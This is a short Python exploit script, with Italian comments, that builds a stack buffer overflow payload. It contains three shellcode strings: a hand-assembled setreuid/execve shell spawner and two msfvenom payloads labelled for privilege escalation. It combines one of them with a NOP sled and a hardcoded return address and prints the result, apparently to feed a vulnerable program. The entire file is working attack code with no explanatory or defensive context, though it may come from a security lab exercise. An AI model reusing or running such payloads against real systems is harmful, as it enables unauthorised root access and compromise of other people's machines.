import sys

buff_size = 200
offset = 8

#shellcode da msfvenom
shellcode = "\xdb\xda\xbb\x5b\xa4\x86\xbc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x16\x03\x5f\x16\xe2\xae\xce\x8d\xe4\xc9\x5d\xf4\x7c\xc4\x02\x71\x9b\x7e\xea\xf2\x0c\x7e\x9c\xdb\xae\x17\x32\xad\xcc\xb5\x22\xa5\x12\x39\xb3\x99\x70\x50\xdd\xca\x07\xca\x21\x42\xbb\x83\xc3\xa1\xbb"

#shellcode per privilege escalation da assembly
shellcode_priv = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

#shellcode per privilege escalation da msfvenom
shellcode_priv2 = "\xdb\xc8\xd9\x74\x24\xf4\x5b\xbf\x54\x93\x91\xba\x2b\xc9\xb1\x13\x31\x7b\x19\x03\x7b\x19\x83\xeb\xfc\xb6\x66\xa0\x73\x07\x52\xa9\xc5\x3f\xa9\xae\xfb\x64\x5b\xb8\xa3\x57\x1c\xf7\x88\x0d\x33\xa0\xe3\x51\x21\x5b\xa4\xc8\xe4\x3d\x3c\xc7\x6b\x4b\x5b\x7f\x43\x38\xcc\x7f\xf3\x91\x6e\x16\x6d\x67\x8d\xba\x99\x7e\x52\x3a\x5a\xae\x30\x53\x34\x9f\xce\xd0\xa0\xdf\x79\x45\xb8\x01\x48\xe9\x8b\x1a\x39\xe8\xb3\x51\x3e"

ret_addr = "\x44\xee\xff\xbf"
nop_sled = "\x90" * (buff_size + offset - len(shellcode_priv2) - len(ret_addr) * 10)
payload = nop_sled + shellcode_priv2 + ret_addr * 10

sys.stdout.write(payload)
